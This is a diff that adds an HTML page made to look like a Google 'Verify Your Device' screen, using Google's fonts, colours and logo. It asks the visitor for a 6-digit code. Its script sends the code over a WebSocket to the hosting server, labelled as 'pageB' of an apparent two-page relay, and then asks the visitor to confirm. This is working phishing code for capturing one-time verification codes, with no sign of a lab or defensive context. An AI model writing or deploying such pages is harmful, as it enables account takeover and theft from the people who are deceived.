@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter Code - Google</title>
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            color: #202124;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #fff;
+        }
+        .container {
+            width: 100%;
+            max-width: 450px;
+            padding: 48px 40px 36px;
+            box-sizing: border-box;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 75px;
+            height: 24px;
+        }
+        .title {
+            font-size: 24px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            font-size: 16px;
+            color: #5f6368;
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        .form-group {
+            margin-bottom: 24px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        .input-field:focus {
+            border: 1px solid #1a73e8;
+            outline: none;
+        }
+        .btn {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+        }
+        .btn:hover {
+            background-color: #1b66c9;
+        }
+        .btn:disabled {
+            background-color: #f1f1f1;
+            color: #5f6368;
+            cursor: not-allowed;
+        }
+        .status {
+            text-align: center;
+            margin-top: 20px;
+            color: #5f6368;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+        </div>
+        <h1 class="title">Verify Your Device</h1>
+        <p class="subtitle">Enter the code to verify your other device</p>
+        
+        <div id="inputSection">
+            <div class="form-group">
+                <input type="text" id="codeInput" class="input-field" placeholder="Enter 6-digit code">
+            </div>
+            <button id="sendBtn" class="btn">Send Code</button>
+        </div>
+        
+        <div id="confirmationSection" style="display: none;">
+            <button id="confirmBtn" class="btn">Confirm Verification</button>
+        </div>
+        
+        <div id="status" class="status"></div>
+    </div>
+
+    <script>
+        // Automatically use the same host/port as the page was loaded from
+        const wsProtocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
+        const wsUrl = wsProtocol + window.location.host;
+        const socket = new WebSocket(wsUrl);
+      
+        socket.onopen = () => {
+          socket.send(JSON.stringify({ type: 'register_pageB' }));
+          console.log("Connected to WebSocket server");
+        };
+      
+        document.getElementById('sendBtn').addEventListener('click', () => {
+          const code = document.getElementById('codeInput').value.trim();
+          if (code) {
+            socket.send(JSON.stringify({ type: 'send_code', code: code }));
+            document.getElementById('inputSection').style.display = 'none';
+            document.getElementById('confirmationSection').style.display = 'block';
+          }
+        });
+      
+        document.getElementById('confirmBtn').addEventListener('click', () => {
+          socket.send(JSON.stringify({ type: 'confirm_verification' }));
+        });
+      </script>
+</body>
+</html>
